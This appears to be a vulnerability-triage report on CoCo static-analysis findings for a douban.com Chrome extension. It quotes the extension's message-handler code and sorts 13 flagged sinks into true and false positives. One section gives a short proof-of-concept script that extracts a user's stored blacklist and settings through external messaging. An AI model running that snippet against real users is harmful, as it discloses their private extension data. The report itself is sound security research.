# CoCo Analysis: okbegmdpgiceefipdjigeebadkehcpil

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 13 (multiple flows)

---

## Sink 1-3: Document_element_href → JQ_obj_html_sink (Referenced only CoCo framework code)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/okbegmdpgiceefipdjigeebadkehcpil/opgen_generated_files/cs_1.js
Line 20: this.href = 'Document_element_href';

**Classification:** FALSE POSITIVE

**Reason:** CoCo only detected flows in framework mock code (Line 20 is in CoCo headers before line 465 where original code starts). The actual extension content scripts only run on douban.com domains and don't have vulnerable jQuery .html() operations with DOM href sources.

---

## Sink 4-9: bg_chrome_runtime_MessageExternal → jQuery_ajax_settings_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/okbegmdpgiceefipdjigeebadkehcpil/opgen_generated_files/bg.js
Line 1212-1213: var url = rexxarAPI + 'group/user/recent_topics?start=' + request.start + '&count=' + request.count + '&ck=' + request.cookie;
Line 1245-1246: var url = rexxarAPI + 'group/' + request.group + '/topics?start=' + request.start + '&count=' + request.count;
Line 1272: var url = rexxarAPI + 'user/' + request.uid;

**Code:**

```javascript
// Background script - Lines 1210-1236
function handleRequestMyTopics(request, sender, sendResponse) {
  if (request.start >= 0 && request.count > 0 && request.cookie) {
    var url = rexxarAPI + 'group/user/recent_topics?start=' +
      request.start + '&count=' + request.count + '&ck=' + request.cookie; // ← attacker controls params
    $.ajax({
      url: 'https://m.douban.com/group/',
      type: "GET"
    }).then(function(){
      $.ajax({
          url: url, // ← SSRF to hardcoded backend
          type: "GET",
          beforeSend: function(xhr) {
            xhr.setRequestHeader('Accept', 'application/json');
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
          }
        })
        .done(function(response) {
          sendResponse(response);
        });
    });
  }
  return true;
}

// Similar handlers for requestGroupTopics (Lines 1242-1263) and requestUserInfo (Lines 1269-1289)
// All called from:
chrome.runtime.onMessageExternal.addListener(handleRequests); // Line 1435
```

**Classification:** FALSE POSITIVE

**Reason:** Data flows to hardcoded backend URLs only. The variable `rexxarAPI` is a hardcoded constant pointing to developer's trusted infrastructure (douban.com API). While attacker controls URL parameters (start, count, cookie, group, uid), these only manipulate query strings to the developer's own backend, not arbitrary URLs. Per methodology, "Data TO hardcoded backend URLs" is FALSE POSITIVE - compromising developer infrastructure is separate from extension vulnerabilities.

---

## Sink 10-12: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/okbegmdpgiceefipdjigeebadkehcpil/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = {'key': 'value'};
Line 1324: if (data.blacklist && data.blacklist.update_time)

**Code:**

```javascript
// Background script - Lines 1316-1363
function handleRequestBlacklist(request, sender, sendResponse) {
  var needReload = request.reload || false;

  chrome.storage.sync.get('blacklist', function(data) {
    if (data.blacklist && data.blacklist.update_time) { // ← storage data
      // ... check if reload needed
    }

    if (needReload) {
      // Fetch from douban.com and update storage
      $.get('https://www.douban.com/contacts/blacklist')
       .done(function(response) {
          var blacklist = {};
          blacklist.urls = urls;
          blacklist.update_time = $.format.date(new Date(), 'yyyy-MM-dd HH:mm:ss');
          chrome.storage.sync.set({'blacklist': blacklist}, function() {
            sendResponse(blacklist); // ← sends storage data back
          });
        });
    } else {
      sendResponse(data.blacklist); // ← sends storage data back
    }
  });
  return true;
}

// Called from external messages:
chrome.runtime.onMessageExternal.addListener(handleRequests); // Line 1435
// Only callable from: "externally_connectable": {"matches": ["*://*.douban.com/*"]}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (*.douban.com)

**Attack:**

```javascript
// From any *.douban.com page (e.g., attacker-controlled subdomain or XSS on douban.com):
chrome.runtime.sendMessage("okbegmdpgiceefipdjigeebadkehcpil",
    {action: "requestBlacklist", reload: false},
    function(response) {
        console.log("Stolen blacklist:", response);
        // response contains blacklist URLs and timestamps
    }
);

// Similar attacks for other storage reads:
// {action: "requestSettings"} - leaks user settings
```

**Impact:** External domains (any *.douban.com subdomain) can exfiltrate extension storage including user blacklists and settings via sendResponse. Complete storage information disclosure to whitelisted external origins.

---

## Sink 13: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/okbegmdpgiceefipdjigeebadkehcpil/opgen_generated_files/bg.js
Line 1398: var settings = request.settings;
Line 1400: settings.update_time = $.format.date(new Date(), 'yyyy-MM-dd HH:mm:ss');

**Code:**

```javascript
// Background script - Lines 1395-1406
function handleUpdateSettings(request, sender, sendResponse) {
  var settings = request.settings; // ← attacker-controlled
  if (settings) {
    settings.update_time = $.format.date(new Date(), 'yyyy-MM-dd HH:mm:ss');
    chrome.storage.sync.set({'settings': settings}, function() { // ← storage poisoning
      sendResponse(settings);
    });
  }
  return true;
}

// Called from external messages:
chrome.runtime.onMessageExternal.addListener(handleRequests); // Line 1435
```

**Classification:** FALSE POSITIVE

**Reason:** Storage poisoning alone without retrieval path. While attacker can write to storage via {action: "updateSettings", settings: {...}}, there's no path for the attacker to retrieve the poisoned data back. The extension reads settings internally but doesn't expose them in a way the attacker can observe the impact. Per methodology, "storage.set only, without storage.get → attacker-accessible output" is FALSE POSITIVE.
